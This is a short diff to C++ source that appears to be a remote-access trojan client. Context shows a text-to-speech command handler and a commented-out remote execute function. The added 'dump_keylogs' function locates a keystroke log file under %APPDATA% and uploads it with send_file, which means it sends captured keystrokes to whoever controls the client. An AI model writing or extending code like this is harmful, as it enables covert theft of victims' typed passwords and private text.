@@ -24,6 +24,17 @@ void CLIENT::speak_command(string& data)
 	pVoice->Release();
 	CoUninitialize();
 }
+
+void CLIENT::dump_keylogs()
+{
+	char *fipt = new char[1000];
+	ExpandEnvironmentStringsA("%APPDATA%", fipt, 1000);
+	string keylogs(fipt);
+	keylogs.append("\\log.txt");
+	send_file(keylogs);
+	delete[] fipt;
+}
+
 /*
 void CLIENT::execute(string& command)
 {
